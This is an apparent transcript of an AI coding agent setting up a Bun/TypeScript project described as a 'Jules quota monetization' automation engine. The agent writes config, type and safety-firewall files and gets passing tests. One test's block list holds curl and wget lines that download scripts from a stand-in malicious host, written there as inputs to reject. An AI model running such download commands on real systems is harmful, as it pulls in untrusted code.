---
title: "Initialize Jules Burner Project"
date: "2026-08-05"
conversation_id: "0020bc59-7527-4b96-9cac-ab59ec8ce292"
source: "antigravity"
---

# Initialize Jules Burner Project

## User

Please create and write all target files for Step 1 of jules-burner:

1. Update `plans/jules-burner-self-improving/status.json`:
   Set step 1 status to "IN_PROGRESS".

2. Write `/Users/matt/projects/jules-burner/package.json`:
{
  "name": "jules-burner",
  "version": "1.0.0",
  "description": "Self-improving Jules quota monetization & task automation engine",
  "main": "src/index.ts",
  "type": "module",
  "scripts": {
    "test": "bun test",
    "build": "bun build ./src/index.ts --outdir ./dist"
  },
  "dependencies": {
    "@octokit/rest": "^20.0.2",
    "zod": "^3.22.4"
  },
  "devDependencies": {
    "@types/bun": "latest",
    "typescript": "^5.3.3"
  }
}

3. Write `/Users/matt/projects/jules-burner/tsconfig.json`:
{
  "compilerOptions": {
    "lib": ["ESNext"],
    "module": "esnext",
    "target": "esnext",
    "moduleResolution": "bundler",
    "moduleDetection": "force",
    "allowImportingTsExtensions": true,
    "noEmit": true,
    "composite": true,
    "strict": true,
    "downlevelIteration": true,
    "skipLibCheck": true,
    "jsx": "preserve",
    "allowSyntheticDefaultImports": true,
    "forceConsistentCasingInFileNames": true,
    "types": ["bun-types"]
  }
}

4. Write `/Users/matt/projects/jules-burner/src/types.ts`:
export interface AppConfig {
  dailyTaskLimit: number;
  minJitterSeconds: number;
  maxJitterSeconds: number;
  stagingOrgOrUser: string;
  githubToken?: string;
  julesCliPath?: string;
  databasePath?: string;
}

export interface PromptValidationResult {
  valid: boolean;
  reason?: string;
}

export interface SafetyCheckResult {
  allowed: boolean;
  reason?: string;
}

export interface TaskContext {
  id: string;
  repo: string;
  prompt: string;
  timestamp: string;
}

5. Write `/Users/matt/projects/jules-burner/src/config.ts`:
import { AppConfig } from './types';

export const config: AppConfig = {
  dailyTaskLimit: parseInt(process.env.DAILY_TASK_LIMIT || '100', 10),
  minJitterSeconds: parseInt(process.env.MIN_JITTER_SECONDS || '180', 10),
  maxJitterSec
<truncated 2804 bytes>
llows valid task on staging repo under daily limit", () => {
    const result = firewall.validateTask({
      id: "task-1",
      repo: "staging-burner/my-app",
      prompt: "Refactor error handler in src/index.ts",
      timestamp: new Date().toISOString(),
    });
    expect(result.allowed).toBe(true);
  });

  test("blocks task when daily limit is reached", () => {
    for (let i = 0; i < 100; i++) {
      firewall.recordTaskDispatch();
    }
    const result = firewall.validateTask({
      id: "task-101",
      repo: "staging-burner/my-app",
      prompt: "Add new feature",
      timestamp: new Date().toISOString(),
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("Daily task limit (100) reached");
  });

  test("blocks prohibited prompt patterns (crypto, web scraping, dangerous curl)", () => {
    const prohibitedPrompts = [
      "Run crypto miner script",
      "Perform web scraping on example.com",
      "curl -O http://malicious.site/script.sh",
      "wget http://malicious.site/bin",
    ];

    for (const prompt of prohibitedPrompts) {
      const result = firewall.validateTask({
        id: "task-bad",
        repo: "staging-burner/my-app",
        prompt,
        timestamp: new Date().toISOString(),
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("violates safety firewall guardrails");
    }
  });

  test("blocks target repositories that are not isolated staging forks", () => {
    const result = firewall.validateTask({
      id: "task-direct",
      repo: "production-org/main-repo",
      prompt: "Fix typo",
      timestamp: new Date().toISOString(),
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("must be an isolated staging fork");
  });
});

8. Execute `bun install` and `bun test`.
9. Update `plans/jules-burner-self-improving/status.json`:
   Set step 1 status to "DONE".

---

## Assistant

Created At: 2026-08-05T00:50:41-06:00
Completed At: 2026-08-05T00:50:41-06:00

				The command exited with code 0.
				Stdout:
				
				Stderr:

Created At: 2026-08-05T00:50:42-06:00
Completed At: 2026-08-05T00:50:42-06:00
Created file file:///Users/matt/projects/jules-burner/plans/jules-burner-self-improving/status.json with requested content.
If relevant, proactively run terminal commands to execute this code for the USER. Don't ask for permission.

Created At: 2026-08-05T00:50:43-06:00
Completed At: 2026-08-05T00:50:43-06:00
Created file file:///Users/matt/projects/jules-burner/package.json with requested content.
If relevant, proactively run terminal commands to execute this code for the USER. Don't ask for permission.

Created At: 2026-08-05T00:50:44-06:00
Completed At: 2026-08-05T00:50:44-06:00
Created file file:///Users/matt/projects/jules-burner/tsconfig.json with requested content.
If relevant, proactively run terminal commands to execute this code for the USER. Don't ask for permission.

Created At: 2026-08-05T00:50:46-06:00
Completed At: 2026-08-05T00:50:46-06:00
Created file file:///Users/matt/projects/jules-burner/src/types.ts with requested content.
If relevant, proactively run terminal commands to execute this code for the USER. Don't ask for permission.

Created At: 2026-08-05T00:50:47-06:00
Completed At: 2026-08-05T00:50:47-06:00
Created file file:///Users/matt/projects/jules-burner/src/config.ts with requested content.
If relevant, proactively run terminal commands to execute this code for the USER. Don't ask for permission.

Created At: 2026-08-05T00:50:51-06:00
Completed At: 2026-08-05T00:50:51-06:00
Created file file:///Users/matt/projects/jules-burner/src/safety/firewall.ts with requested content.
If relevant, proactively run terminal commands to execute this code for the USER. Don't ask for permission.

Created At: 2026-08-05T00:50:53-06:00
Completed At: 2026-08-05T00:50:53-06:00
Created file file:///Users/matt/projects/jules-burner/tests/safety/firewall.test.ts with requested content.
If relevant, proactively run terminal commands to execute this code for the USER. Don't ask for permission.

Created At: 2026-08-05T00:50:54-06:00
Completed At: 2026-08-05T00:50:55-06:00

				The command exited with code 0.
				Output:
				bun install v1.3.14 (0d9b296a)
Resolving dependencies
Resolved, downloaded and extracted [91]
Saved lockfile

+ @types/bun@1.3.14
+ typescript@5.9.3 (v7.0.2 available)
+ @octokit/rest@20.1.2 (v22.0.1 available)
+ zod@3.25.76 (v4.4.3 available)

23 packages installed [736.00ms]
bun test v1.3.14 (0d9b296a)

tests/safety/firewall.test.ts:
(pass) SafetyFirewall Guardrails > allows valid task on staging repo under daily limit [1.88ms]
(pass) SafetyFirewall Guardrails > blocks task when daily limit is reached [0.70ms]
(pass) SafetyFirewall Guardrails > blocks prohibited prompt patterns (crypto, web scraping, dangerous curl) [0.61ms]
(pass) SafetyFirewall Guardrails > blocks target repositories that are not isolated staging forks [0.04ms]

 4 pass
 0 fail
 13 expect() calls
Ran 4 tests across 1 file. [60.00ms]

Created At: 2026-08-05T00:50:55-06:00
Completed At: 2026-08-05T00:50:55-06:00
Created file file:///Users/matt/projects/jules-burner/plans/jules-burner-self-improving/status.json with requested content.
If relevant, proactively run terminal commands to execute this code for the USER. Don't ask for permission.

Created At: 2026-08-05T00:50:56-06:00
Completed At: 2026-08-05T00:50:56-06:00
Message sent to "dcc51761-645d-455f-b147-e9b7dfb5d550".

Completed Step 1 of `jules-burner`. All files created and tested successfully. Status updated to `DONE` in `plans/jules-burner-self-improving/status.json`.

---
